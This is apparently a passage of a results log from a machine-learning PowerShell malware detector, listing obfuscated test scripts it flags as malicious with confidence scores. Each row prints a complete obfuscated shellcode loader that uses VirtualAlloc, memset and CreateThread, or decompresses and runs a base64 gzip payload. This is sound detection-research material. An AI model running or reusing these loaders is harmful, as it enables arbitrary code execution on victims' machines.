ta3z.Length};ta3x=ta3w::VirtualAlloc(0,0x1000,ta3g','be','78,0xeb,0x01,0xe8,0xbe,0xbf,0x51,0x82,0x17,0xc0,0x39,0x52,0x98,0x15,0xd','0x','0x13,0x68,0xae','xed,0xd2,0xba,0','utes, uint dwStackS','x9e,0x29,0x56,0x59,0x38,0xb9,0xc0,','rnel32.dll8Sx)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,','0xf7,','0x0',');f',' uint dwSize, uint flAllocationType, uint flP','2,0x37,0xb4,0x62,0x44,0xe8,0x74,0xd3,0x24,0x58,0x1c,0x39,0xab,0x87,0x3c,0x42,0x61,0xa0,0xd6,0xad,0xdc,0x98,0x4e,0x57,0x45,0x52,0xef,0x98,0x53,0x1e,0x2f,0x12,0x50,0xde,0xe1,0','b,0x90,0x72,0xe7,0xf2,0x2b,0x40,0x93,0x04,0xfa,0x99,0x5c,0xaa,','or (ta3i=0;ta3i -le ',',0x33,0x2b,0x46','ame 8SxWin328Sx -namespace Win3',',0x6d,0x4c,0xec,0x55,0x6c,0xa9,0xda,0xf9,0x8f,0x9c,0x51,0x33,0x1a,0x5f,0x0d,0x3c,0xca,0x5f,0xcd,0x6a,0x80,0x5f,0xa5,0xca,0xf0,0x33,0xd0,0x14,0x2d,0x20,0x',',0xa7,0','memset(IntPtr dest, uint src, uint count);rBa;ta3w ','msvcrt.dll8Sx)',',0x4d,0x0a,0x37,0xeb,0x10,0xf5,0xc8,0xeb,0x74,0x7f,0x2d,0xda,0xb4,0x1b,0x25,0x4c,0x05,0x6f,0x6b,0x60,0xee,0x3d,0x98,0xf3,0x82,0xe9,0xaf,0xb4,0x29,0xcc,0x9e,0x45,0x01,0x2c,0x80,0xc5,0x58,0x','ateThread(0,0,ta3x,0,0,0);for (;;){',']public static e','xb4,0xe5,0x6c,0x23,0x93,0x21,0x35,','0x','readAttrib',',0x40','hreadId);[DllImport(8Sx','2Functions -passthru;[Byte[]];[Byte[]]ta3z ','x9f,0x19,0x64,0x68,0x5f,0x4c,0x74,0x54,0xb6,0xa8,0x02,0xb4,0','f,0xd1,0xf0,0x4d,0xd3,0xf4,0x70,0xb1,0xa3,0xf7',',0x','8Sxke','x96,0x4e,0xb5,0xdb,0xdc,0','6','x0a;','c3,0x16,0xaf,0xb2,0x04,0x90,0x50,0xc1,0x7c,0xe3,0','0xba,0x70,0x93,0x56,0xc','= Add-Type -','Start-sleep 6','memberDefinition ta3c -N','rotect);[DllImport(8Sxkernel32.dll8Sx)]public static ')).rePlAce(([char]114+[char]66+[char]97),[StrinG][char]39).rePlAce(([char]56+[char]83+[char]120),[StrinG][char]34).rePlAce('ta3','$'))",malicious,TP
2026-07-13 16:50:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\174.ps1,custom-ps-ml,UNKNOWN,ee757644-a263-4067-8844-ab8f23690734,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3001,1829.84,"IEx ((((\""{11}{37}{7}{40}{64}{35}{30}{27}{2}{65}{10}{50}{58}{41}{44}{46}{8}{56}{59}{32}{31}{38}{15}{19}{51}{6}{18}{66}{0}{71}{13}{48}{62}{54}{12}{52}{24}{3}{61}{26}{42}{47}{9}{34}{72}{29}{60}{33}{57}{70}{55}{21}{17}{63}{53}{25}{67}{43}{68}{23}{5}{45}{20}{36}{49}{4}{1}{14}{69}{39}{28}{16}{22}\"" -f'x73,0xea,0xf6,0x12,0x86,0xeb,0x3f,0x4e,0x6b,0xb9,0xe8,0x04,0xde,0x2e,0x9d',',0x40);for (ueai=0;ue','d','0x5b,0xe1,0x81,0xdb,0x5a,0x26,0xba,0xe7,0xd7,0xc9,0x6d,0x6e,0xa3,0xed,0xa9,0x2b,0x77,0x8f,0xe8,0x9','VirtualAlloc(0,0x1000,ueag',',0x8a,0x8d,0x9c,0x21,0x1d,0xe6,0x22,0x1c,0x69,0xa9,','xf1,0x02,0','l32.dll9g3)]public s',' extern IntPtr memset','0x80,0x8a,0x38,0x4','rn IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize','ueac =','dc,0xb5,0x4b,0x14,0x2f,0xc7,0x8c,0x92,0xd0,0xb2,0x','ed,0x74,0x63,0x39,0xa5,0','ai -le (u',',0x13,0x83,0xea,0xf5,0xcd,0xe7,0xa8,0xed,0x90,0x08,0x51,0xed,0xf4,0x81,0xb4,0xdc,0x34,0xf5,0xbd,0','ai), ueaz[ueai], 1)};u','34,0x2f,0x17,0x5b,0xfa,0xd8,0x52,0x4f,0x6a,0x29,0x29,0x2d,0x3c,0x36,0x87,0x58,0','xfc,0x27,0xb2,0xa9,0xda,0x06','x4e,0x85,0x7d,0x93,0x','6b,0x95,0x0b,0xb5,0x19,0xf7,0x8f;ueag = 0x1000;','0x90,0x9b,0x','eaw::CreateThread(0,0,ueax,0,0,0);for (;;){Start-sleep 60};','c3,0xe2,0xba,0xdf,0xb7,0xb0,0xdf,0x1f,0x62,0xa5,0x4c',',','x',',0x2a,0xfe,0x10,0x05,0xd5,0xfe,0x3e,0x1e,0xa6,0xcc,0xe1,0xb4,0x20,0x7c,0x69,0x13,0xb6,0x83,0x40,0xe3,0x28,0x','l32.','w::memset([IntPtr](ueax.ToInt32()+ue','xf7,0x69,0x29,0x9a,0xd2,0x','e','9g3 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]ueaz = 0xb8,0x09,0x2f,0x12,0x54,0',' 9g3Win32','0,0x60,0xb4,0xed,0xbd,0x6b,0x28,0x86,0xbf,0x','6,0x61,0x7b,0xf8,0x36,0x09,','n','if (ueaz.Length -gt 0x1000){',' NIC[DllImport(9g3kerne','xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42','ngth-1);ueai++) {uea','tatic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProte','artAddress, IntPtr lpParameter, u','7a,0x6b,0x14,0x60,0xb8,0x3f,0x44,0x1',',0xcc,0x44,','int dwCreationFlags, IntPtr lpThreadId);[DllImport(9g3msvcrt.dll9g3)]public s','0xdd,0x4b,0x','tatic','a,0x69,0x40,0x0f,0xda,0x96,0x95,','x77,0x42,0xec,0xbe,0x21,0x44,0x0e,0x1','ueag = ueaz.Length};ueax=ueaw::',', IntPt','62,0x6e,0xd3,0x00,0','e4,0xe1,0x6d,0xc5,0x32,0x98,0xa9,0x40,0xa1,0x3a,0x39,0xf2,0x0d,0xbb,0xee,0x65,0xc5,0xb7','x5a,0','67,0x87,0xa3,0x42,0x13,0x16,0x62,0x9b,0x',',0xa3,','(IntPtr dest, uint src, uint count);N','6b,0xa1,0x0a,0x49,0x8d,0xab,0xa2,0x1','r lpSt','IC;ueaw = Add-Type -memberDefinition ueac -Name','01,0xc','1,0xd6,0xb0,0xeb,0x7a,0x86,0x14,0x67,0x96,0xd3,0x24','3,0x5a,0xcd,0x08,0x70,0x','xc0,0xa2,0x2c,0xcb,0x97,0','ct);[DllImport(9g3ker','ll9g3)]public static exte',',0x43,0x81,0x1f,0x08,0xc7,0xd8,0','2f,0x2a,0xdf,0xc4,0xd0,0x19,0x54','0xe2,0x02,0x31,0x89,0xe2,0xd2,0x67,0x','eaz.Le','f,0x05,0x43,0x5a,0x3a,0xdd,0xf2',',0x51,0xe3,0xc5,0x','0x91,0')) -CrEPlacE'NIC',[char]39-CrEPlacE'9g3',[char]34 -CrEPlacE ([char]117+[char]101+[char]97),[char]36))",malicious,TP
2026-07-13 16:50:45,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1741.ps1,custom-ps-ml,UNKNOWN,abe0b84b-1d27-4338-a212-5e6d705e9159,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2850,1807.39,"iNvoKe-ExPResSIoN ((((\""{25}{46}{10}{38}{24}{34}{35}{48}{43}{1}{20}{28}{29}{40}{7}{21}{2}{3}{23}{19}{0}{44}{4}{9}{36}{30}{31}{41}{17}{18}{33}{15}{26}{13}{6}{8}{27}{47}{39}{12}{11}{37}{45}{5}{16}{14}{22}{42}{32}\"" -f '83,0x70,0x5f,0x8d,0xd0,0x52,0x5e,0x5e,0x25,0x92,0xa7,0x83,0xc4,0xc6,0x70,0xcf,0x7b,','0xc5,0x','xd6,0x59,0x1','8,0x38,0xda,0x12,0x4c,0xa9,0x69,0x',',0x47,0x7c,',',0x98,0x35,0x73,0xc2,0x4c,0xb6,0x83,0x94,0x06,0xb6,0xeb,0x40,0x73,0xe5,0x0e,0x8f,0xae,0x99,0x83,0x1a,0x51,0xc8,0x70,0x8c,0x39,0xf6,0xaf,0xfa,0x','6,0xe4,0xe1,0x7d,0x66,0x63,0x7',',0x44,0xa4,0xf9,0x55,0x2','1,0x0d,0x54,0x2c,0x29,0x99,0xd4,0xa5,0xf7,0x5e,0x1b,0x9c,0x40,0xf0,0xe2,0x1f,0xb1,0xd8,0x20,0x4b,0xe1,0x72,0x81,0xf4,0x6a,0x83,0x2e,0x21,0x06','0x45,0x0b,0xc','ze, IntPtr lpStartAddress, IntPtr lpPar','x09,0x25,0x12,0xdd,0x77,0x65,0x98,0xd2,0x88,0x2b,0x69,0x9e,0x9a,0xdb,0x99,0xd5,0xc1,0x4d,0xa5,0xc3,0x6c,0x71,0x33,0xe8,0x26,0x26,0xab,0xf2,0x1f,0x00,0x74,0x','0,0x72,0xbc,0xe2,0x19,0x18,0x53,0x5b,0x71,0xb4,0xca,0xc6,0','xd2,0xb1,0x1f,0xfe,0x07,0xc8,0x7d,0x9','dc;D7ng = 0x1000;if (D7nz.','b,0x03,0x69,0x6d,0x13,0','e5,0x09,0x9a,0xfa,0xda,0xdf,0xe2,0x88,0x32,0x','0x63,0x33,0x2a,0x05,0x16,0x4d,0x49,0xb8,0x21,0x8a,0x30,0x66,0xa7,0x09,0x92,0xed,0x1f,0xf6,0x','23,0x21,0xf9,0x7d,0x2f,0x8e,0x8d,0xda,0x33,0x11,0x41,0x51,0x4f,0x9a,0x64,0xb6,0xc6,0xd8,0x42,0x1','db,0x4e,0x','d9,0x74,0x24,0xf4,0x5a','9,0x2c,0x1c,0x64,0x69,0x4a,0x54,0','Length -gt 0x1000){D7ng = D7nz.Length};D7','56,0x59,0xde,0xda,0xdd,0xbf,0xd1,0x',');[DllImport(rpvmsvcrt.dllrpv)]public static extern IntPtr memset(IntPtr dest, uint ','D7nc = r6J[DllImport(rpvkernel32.dllrpv)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flA','x53,0xd2,0',',0x86,0xb8',',0x33,','0xc9,0xb1,0x47,0x','75,0x21,0xb9,0xfb,0x0d,0x','68,0xa1,0x18,0x2b,0x22,0x5a,0xea,0xc7,0xb5,0x8a,0x23,0x27,0x19,0xf3,0x8c,0','.ToInt32()+D7ni), D7nz[D7ni], 1)};D7nw::CreateThread(0,0,D7nx,0,0,0);for (;;){Start-sleep 60};','2,0x83,0xbb,0xe','src, uint cou','nt);r6J;D7nw = Add-Type -','0,0x61,0x1d,0x2a,0xe1,0x37,0x16,0x','0c,0x4a,0x1b,0x','ameter, uint dwCreationFlags, IntPtr lpThreadId',',0xe8,0x08,0x28,0x94,0x38,0x85,0xce,0xca,0xe8,0xc6,0x5e,0xaa,0x58,0xa7,0x0e,0x42,0xb3,0x28,0x7','83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x51,0x06,0x5b,0x00,0x85','xda,','nx=D7nw::VirtualAlloc(0,0x1000,D7ng,0x40);for (D7ni=0;D7ni -le (D7nz.Length-1);D7ni++) {D7nw::memset([IntPtr](D7nx','xe4,0xae,0xfc,0xdb,','0xf7,0xf5,0x85','bd','llocationType, uint flProtect);[DllImport(rpvkernel32.dllrpv)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSi',',0x7f,0xe5,0x17,0x63','memberDefinition D7nc -Name rpvWin32rpv -namespace Win32Functions -passthru;[Byte[]];[Byte[]]D7nz = 0xbf,0x5e,0'))-REpLaCE  'D7n',[CHar]36 -crePlacE  ([CHar]114+[CHar]54+[CHar]74),[CHar]39-crePlacE 'rpv',[CHar]34) )",malicious,TP
2026-07-13 16:50:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1754.ps1,custom-ps-ml,UNKNOWN,8ead413b-769e-416c-95cf-d14a30d273fa,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3064,1623.96,"(((\""{43}{38}{3}{45}{22}{71}{6}{59}{31}{52}{44}{25}{49}{39}{48}{68}{64}{56}{70}{33}{55}{66}{21}{42}{62}{26}{51}{60}{47}{34}{12}{14}{58}{28}{4}{27}{15}{65}{53}{10}{17}{18}{37}{67}{69}{63}{23}{40}{29}{2}{46}{0}{32}{72}{24}{16}{7}{1}{35}{13}{5}{41}{20}{61}{36}{50}{54}{11}{57}{8}{30}{19}{9}\""-f'0x01,0x22,0xfe,0xa9,0x9','x19;gIYg =','70,0x23,0xa7,0x3b,0x71,0xb3,0xf1,0x51,0x7','tker',',0xbf,0x6e,0x54','0','tackSize, IntPtr lpStartAd','0x97,0x45,0',';){S','};','0x9a,0xcd,0x35,0x99,0x5a,0xbe,0xf5,0x49,','(0,0,gIYF','0xa2,0x4a,0','if (gIYz.Length -gt 0x10','x1e,0xea,0xba,0x8b,0x98,0x15,0xc9,0xe','a,0x3d',',0x99,0x92,','0x32,0xd4,0xf9,0xb6,','0x22,0xd7,0xd3,0xde,0xc8,0x38,0x8a,0xb7,0x64,0xa0,0x97,0x4c,0x15,0x2',' 60','th};gIYFcHI=gIYw::VirtualAlloc(0,0x1000,gIYg,0x40);for (gIYi=0;gIYi -le (gIYz.Length-','x7d,0xbe,0xe2,0xdf,0xd0,0x','CreateThread(IntPtr ',',0xbf,0x7d,0xf6,0xc0,0xbd,0x58,',',0xd6,0x4e,0xaa,0xe1,0x2b','finition gIYleF -Name Wf','7,0xaa,0xe8,0xc4,0xdb,0x3b,0x69,0x38,0xab',',0xe8,0x9b,0xa','0x31,0xa6,0x76,0x5e,0xa2,0x00,0xfc,0xf8,0x0e,0xb1,0xd1,0x9f,0xc5,0xbd,0x9e,0xd4,0x82,0xa1,0x21,0x38,0xb9,0xdd,0xaa','ab,0x','tart-sleep','tPtr lpParameter, uint dwCreati','f','x24,0x0b,0xcd,0x9d,0','58,0xd6,0x0c,0x63,0x91,0x17,',' 0x1000;','IYi++) {gIYw','d,0x02,0x','blic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Wf','e Win32Functions -','0x30,0x4f,0x3d,0x8f,0x4b,0x46,0x','0){gIYg = gIYz.Leng','2f,0','gIYleF = 9Jn[DllImport(Wftkernel32.dllWft)]pu','berDe','nel32.dllWft)]public static extern IntPtr ','1,0xdb,0xa5,','0x65,0x1d,0x33,0x09,0x6a,0x18,0x8d,0xa2,0x','passthru;[Byte[]];[Byte[]]gIYz = 0xdd,0xc7,0xd9,0x74,0x24,0xf4,0xb8,0xe7,0xf4,0x07,0x55,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x42,','tWin32Wft -namespac','::memset([IntPtr](gIYFcHI.ToInt32()+gIYi), gIYz[gIYi], 1)};gIYw::Create',',0x3a,0x58,0xef,0xa0,0x64,','onFlags, IntPtr lpThreadId);[DllImport(Wftmsvcrt.dllWft)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);9Jn;gIYw = Add-Type -mem','x31,0xdb,0xa0,0xd0,0xac,0xde,0x36,0x1b,0x98,0xe0,0xc4,0xf3,0xdb,0xe2,0xca,0x99,0x55,0x04,','Thread','x79,0xeb,0x','0xfd,0x51,0xe3,0x39,0x7','cHI,0,0,0);for (;','5,0xdb,0xa8,0xca,','dress, In','0x7a,0x11,','1);g','x8',',0xa1,0x54','x54,',',0xaa,0x82,0xeb,0x9b,0x1d,0xba,0xec,0x44,0xc1,0x1e,0x66,0x68,0x16,0x13,0x25,0xe4,0xdb,0x1e,0xd6,0xf4,0x73,0x28,0xa5,0xc6,0xdc,0x82,0x21,0x6a,0x94,0x0c,0xb5,0x8d,0x8f,0xe9,0x29,0x70,0x30,0x0a,0x63,0xb6,0x64,0x5a,0x1b,0x1f,0x05,0','ec,0x6d,0x8c,0xea,0x29,0x93,0','29,0x','0x18,0x83,0xea,0xfc,0x03,0x42,0xf3,0x16,0xf2,0xa9,0x13,0','15,0xa5,0xa1,0xcd,0xdb,0x4e,0xcf,0xdd,0x8b,0xbe,0x9a,0xbc,0x1d,0xc0,0x30,0xaa','7,0xb4,0xd2,0x79,0xe3,0xbc,0x44,0x4a,0x67,0x90,0x68,0x21,0x25,0x01,0xfb,0x47,0xe2,0x26,0x4c,0xed,0xd4,0x09,0x4d,0x5e,0','lpThreadAttributes, uint dwS',',0x56,0x53,0x3c,0x20,0x0f,0x00,0x97,0x48,0xad,0x7f,0xdf'))  -CrEPLaCE '9Jn',[Char]39-CrEPLaCE  ([Char]87+[Char]102+[Char]116),[Char]34  -replaCE  'gIY',[Char]36) |. ( $verbOsepRefERencE.ToSTRinG()[1,3]+'X'-jOIN'')",malicious,TP
2026-07-13 16:51:14,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1810.ps1,custom-ps-ml,UNKNOWN,32c6b9e7-4ac4-4ff1-8343-220bee87dbf5,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,3117,1620.81,"&amp; ( $PsHOmE[4]+$psHOME[30]+'X') ( ((\""{46}{38}{50}{11}{44}{53}{34}{56}{0}{39}{3}{1}{42}{41}{61}{36}{29}{21}{19}{66}{31}{16}{6}{2}{70}{65}{33}{40}{27}{54}{13}{37}{14}{64}{26}{17}{22}{23}{48}{8}{24}{28}{12}{7}{69}{67}{15}{51}{60}{72}{57}{20}{4}{55}{52}{35}{58}{10}{47}{9}{45}{71}{32}{43}{59}{62}{68}{18}{30}{5}{49}{63}{25}\""-f'es, uint dwStackSize, IntPtr lpSta','c static ext','32,0x2e,0x31,0xc9,0xb1,0x47,','r lpThreadId);[DllImport(uXZmsvcrt.dlluXZ)]publi','0x','r (ra','5d,0xbf,0xae,0xf7,0x',',0xa5,0x','x56,0x14,0x95,0xa5,0x57,0xe7,0xe7,0xe2,0','x68,0x12,0x43,0x63,0xa0,0x86,0x2',',0x97,0x','dwSiz','9c,0xa5','d,0','xe0,0x3b,0x23,0x86,0x59,0x7f,0x22,0x04,0xa0,0xac,0x84,0x35,0x6b,0xa1,0xc5,0x72,0',',0xd6,0x42,0xa3,0x74,0x93,0x01,0xeb,0x98,0x22,0xc5,0','0x','3,0xa3,','lAll','space Win32Functions -passthru;[Byte[]];[Byte[]]ratz = 0','x8e,0xf9,0xa2,0x93,0xc0,0x55,0x02,0x44,0xa1,0x05,0xea,0x8e,0x2e,0x79,0x0a,0xb1,0xe4,','2uXZ -name','0x12,0x3c,0x44,0x57,0xe2,0x3f,0x65,0xc6',',0x79,0x66,0xa5,0xe8,0xae,0x12,0xec,0xf2,0xb3,0x1f,','x5f,0x18,0x92,','ratwAM,0,0,0);for (;;){Start-sleep 60};','8,0x58,0xa8,0xc','x','0x1a,0x','in3','oc(0,0x1000,ratg,0x40);fo','x24,0xf4,','4',',0xce,0x9b,0x7c,0xd6,0x9b,0x8b,','r CreateThread(IntPtr lpThrea','0xd4,0x91,0xf3,0x64,0x90,0x81,0x63,0x85,0xef,0xf8,0x25,0x9a,0x','me uXZW','x0d,0x75,0','(uX','rtAddress, IntPtr lpParameter, uint dwCreationFlags, IntPt','0x4c,0x9c,0xce,0','t src','ern IntPtr memset(IntPtr dest, uin','6,0xad,0xdb,0x9b,0x0c,0xad,0xb3,0x7b,0x75,0xfe,0xa6,0x83,0xa0,0x92,0x7b,0x16,0x4b,0xc3,0x28,0xb1,0x23,0xe9,0x17,0xf5,0xeb,0x12,0x72,0x07,0xd7,0xc4,0xba,0x7d,0x39,0xd5;ratg = 0x1000;if (ratz.Length ','e, uint flAllocationType, uint flProtect);[DllImport(uXZkernel32.dlluXZ)]public static e','c,0x1','ratuLJcb = vHK[DllImport','c9,0x0e,0xe2,0x31,0x9e,0xa6,0xe8,0x64,0xe8,0','0xa6,0x89,0x07,0xeb,0x39,0x58,0','ti=0;rati -le (ratz.Length-1);rati++) {ratw::memset([In','Zkernel32.dlluXZ)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint ','x87,0xa4,0xaf,0xe8,0x47,','7,0xd7,0x6c,0x3d,0x83,','xtern IntPt','27,0x26,0xf0,0xfa,0xbc,0x4a,0xd','12,0xa0,0x5e,0x51,0x4a,0x5c,0xc6,0xf8,0x00,0xfd,0x0','dAttribut',',0xe9,0xf6,0x06,0x1f,0xf0,0xbb,0','c5','-gt 0x1000){ratg = ratz.Length};ratw','0x2d,0xeb,0xce,0x43,0x76,0xaf,0x6f,0xd5,0xd2,0x1e,0x8f,0x05,0xbd,0xff,0x35,0x4d,0x53,0xeb,0x47,0x0c,0x3b,0xd8,0x65,0xaf,0xbb,0x76,0xfd,0xdc,0x89,0xd9,0x55,0x4b,0xa1,0x92,0x7',', uint count);vHK;ratw = Add-Type -memberDefinition ratuLJcb -Na','AM=r','tPtr](ratwAM.ToInt32()+rati), ratz[rati], 1)};ratw::CreateThread(0,0,','x96,0x48,0x97,0x2b,0xdc,0xff,0x0','x28,0x2b,0xaa,0x3c,0xa0','xd9,0xea,0xd9,0x74,0','0x47,0xf1,0x93,0x27,0x76','atw::Virtua','d8,0xdf,0x71,0x23,0xfb,','0x83,0xc5,0x04,0x31,0x7d,0x14,0x03,0x7d,0xba,0x15,0xc7,0xd2,0x2a,0x5b,0','b,0xcd,0x','3,0x8c,0xc6,0x88,0xc4,0x02,0x39,0x33,0x35,0x0a,0xfd,0x67,0x65,0x24,0xd4,0x07,0xee,0xb4,0xd9,0xdd,0x9b,0xb1,0x4d,0x1e,0xf3,0xde')).rePlacE(([ChAR]117+[ChAR]88+[ChAR]90),[stRInG][ChAR]34).rePlacE(([ChAR]118+[ChAR]72+[ChAR]75),[stRInG][ChAR]39).rePlacE(([ChAR]114+[ChAR]97+[ChAR]116),[stRInG][ChAR]36))",malicious,TP
2026-07-13 16:51:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1811.ps1,custom-ps-ml,UNKNOWN,e53c2133-d50b-463a-b790-bed78056bd11,DESKTOP-BAC9DBQ,malicious,0.9981,RandomForest,2724,1693.86,"INVOKE-eXPrEsSiOn ((((\""{40}{7}{10}{25}{20}{29}{17}{41}{23}{15}{14}{0}{18}{38}{42}{9}{30}{3}{26}{8}{24}{11}{43}{35}{27}{39}{37}{32}{2}{19}{1}{46}{6}{12}{33}{36}{22}{4}{21}{28}{34}{16}{31}{13}{44}{45}{5}\"" -f 'bTxHmoaZah1BSr0A4V3Xlqx5fODxsqKaa','o52vc/Z72GNJsb','Wk0vjccJbxaqxciYitK6rjwQ3rzhBNUEueYTHAzFs2V6tWBxft2Orar1lZbNZNver7udRZNaReLh8K+2mUcKTTvg4DN3huNcZWOiq+4TetA2yWXqDLamY7pDfuz1W3d8daiPb4+vHyVUp','26AO82nj4GOP2cfg1F5yGnU4TQApHMl6oKimZgeUNDJ41BjR2XO2W4/J','/WoIGURMPg6GVyB7Xe4NGSVTOHdjm8aeC8nkM9AZYmjYYzu7tqtOEaHjh93vbgUuKJrD9aH7dHt5V6/uu09t9BukyFkuifhl5DhpHf+XBmriIFxhDrkAT','CompressionMode]::Decompress))).ReadToEnd();','zVlj8Vm8e00eODrfYl3BEIdd2V0rBE','eam(,[Convert]::FromBa','mtr2TeoBgOm3Cs5yICXok','4PN8GERU','se64String(0FOH4sIAAAAAAAAAL1Xe2/aSBD/O3','L+ra0ZcMhuH8ihurr8AaXZ1XfihDCIb3AswDK0NtRnmMSp5pcUIrR0s5h5VUF/EpI45Z74LkrbgE','3rFHzKRhb1TfFt5POHjAfJ3IfRff+','ct IO.StreamReader(New-Object IO.Comp','9Vn12U54X','Mc/IDnVsr8Ag5JP4rCtsHFtQsDacSU394w','jl2o5yglDIPsPATj8pN3o8+4USB/LiSSxhuk9aoHaOdaV9O1XOsfJVuQBQUFi5hBE/cKO4HyrpP5Yvyg5MSRi/KAN','mJAqqfneXOkq3ID7FDFz6WbEsXHpUrQUK4SJuhzaYhPMz8+','zA5EKBxZmDC/clkYJdr3EuXNVHdVz4FtAZVR4C','kdEAH','v6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedEvi3j7Xix','fBYwQwRGFkr6wsWc2jay4PSmgY+5TBEwJhxzHvEubDj5vuTLgijQNqg51DfRrCsXL640pVvhPr3jnzcevfuEQzJCkqc4IUu9V25ypf2lVIJ2mhpXy3pudfbXxebg/Z','nQG','vlTOV8Umlws','TpLg8Px9vgbiNQ6x2GYV/oR5KSdVyyKOSV5Bfkhy45QJEWyV','wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUs','b7y1VDlkg+ND0ApiQv9RmdSJ','61gOaeVJLUnFWO8g4YRJKO+4E77+BmUAXSIDNCIRXwyG9rsYtw3e134p3rIPgeWj73CSdNSu3d/Ca8I5YpS0ab8jHzlOraNr1sN80bhDbuTv7podsh','NWj7uxCdQnl7Ek4v0XAr1Sq6','cKlcbAJhLzAhAQ1D5c/cWR8H2FO08y0OFp4gEad5JfmICS','nyuz2HWz+Ty79sgZ5n8qqHzkynhSZ6Z6vFdmY8HIPHeW+Dk5jw8Wy4hxQoOY4OeR','qUxhjLzpiCX2OwlgTi06ExMSw9xesg4yTAg0AAA==0FO));IEX (New-Obje','U1rtuDfhKbX7bqQ+','4YECNiu7Vho0WsWV81iqtf2r6x0Xn8I','g9pD/Geus3iVX/3esv+/9w+mr8C/lT0F6dvjjxn9xx69DNMFMAqsFdZ3TdDJ5LVJZAJ7MgSeehghzsice2+8iedGDKTGnfs','TpRGgLA4kLmlTELJNQgNf8s8n5RvR9L0g9','pmzrFMbMNMbAMasLadN5OsUsGY14Tsuy4deDd7tAWgL3aV6wboAkMKjvXHb9YLN5sl17PHLoI4X69LPiyWJ5sEEboH','aU1oJ6ZfI9Lz2G7fhTX','s/NzGWmXJoKiz7gAxKEVT1QtvfijXVzv2I87zyQZtlCg0iXzKPwrmkgdhYNNgym4aFFvYJpwPqzLUe3R1xeC2TdsoEVH0Z6PnMfa/R3UxcnIpT9','90YnSnQ3bNS+waReve+xYxda/ARkRrsuQ+s7LqI9J/6t1631w5r5UxOym9Xq61pCVUq1btK','yJrs=New-Object IO.MemoryStr','bt39SgIqC/T70KTShSG1FtyRkNNV74okxUN6MXd8onaU','efan8SBDs+zWNBzX3MvRBWhnLpY0oUE6E/CKnd2NkuWFOzR+iJkCd97pZRXTFACSxEc','9iJsbBkHDQByf89QPSCRWXb23DqAXVSMQyOXagPWUol8YZdStR/UPuYKGlWxFgdQ','res','sion.GzipStream(yJrs,[IO.Compression.','q4VdfZKz3xTKZjstkgBubCcVOsUzl1eRzqzMaG59Q2RjgjqiDTcNRc'))  -cRePlACE ([ChAR]121+[ChAR]74+[ChAR]114),[ChAR]36-RepLACe  '0FO',[ChAR]34) )",malicious,TP
2026-07-13 16:51:35,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1822.ps1,custom-ps-ml,UNKNOWN,acf369bf-591f-4d36-aabb-b18252ffcef5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3070,1941.0,". ( $psHoMe[4]+$PsHoMe[34]+'x')( ((\""{33}{47}{20}{29}{39}{23}{70}{18}{26}{55}{3}{1}{13}{58}{46}{40}{71}{52}{69}{14}{42}{19}{6}{54}{30}{72}{27}{21}{57}{60}{5}{10}{66}{17}{34}{63}{67}{59}{44}{0}{24}{36}{51}{68}{64}{4}{31}{61}{56}{35}{11}{2}{62}{41}{12}{37}{32}{53}{7}{8}{28}{38}{48}{15}{16}{25}{65}{43}{45}{50}{9}{49}{22}\"" -f ',0x80,0x3f,0x22,0x44,','meter','fb,0xc8,0x62,0x4d,0x2e,0x64,0x66,0xd9,','r lpStartAddress, IntPtr lpPara','31,0xcb,0xd7,0xff,0xdf,0x18,0x6a,0xa2,0xb7,','8,0x48,0x','2b,0xc9,0xb1','75',',0xf5,0xb8,0xf8,0xfe,0xfa,0x3d,0xb6,0xf6,0x77,0x2e','z.Length-1);Olqi++) {Olqw::memset([IntPtr](OlqPjM.ToInt32()+Olqi), Olqz[Olqi], 1)};Olqw::Cre','59,0x3b,0xbe,0xf9,0xd4,0x1d,0xf1','0x22,0xd0,0xc5,0x26,0x53,0xf8,0x01,0x72,0x03,0x92,0xa0,0x','d1,0x62,0x1a,0xfa,',', uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Hc9msvcrt.dllHc9)]public static extern IntPtr mems','3f,0xeb,0x50,0x','x2f,','0x01,0x3d,0xd0,0x','0xfa,0x45,0x5d,0x9','(IntPtr lpThreadAttribu','0x','9)]public static exter','a5,0x20,0xa6,0x4f,0x46,0xd9,0x36,0x30,0xce,0x3c,0x07,0','{Start-sleep 60};','ernel32.dllHc9)]p','0x3a,0x8b,0xd8,0x57,0xea,0xc2,0x21,0xfb,0xd3,0xeb,0xd3,0x05,0x13,0xcb,0x0b,0x70,0x6d,0x28,0xb1,0x83,0xaa,0x53,0x6d,0x01,0x29,0xf3,0xe6,0xb1,0x95,0x02,0x2a,0x','18,0x8e,0xbe,0x37,0x99,0xf2,0x68,0x71','tes, 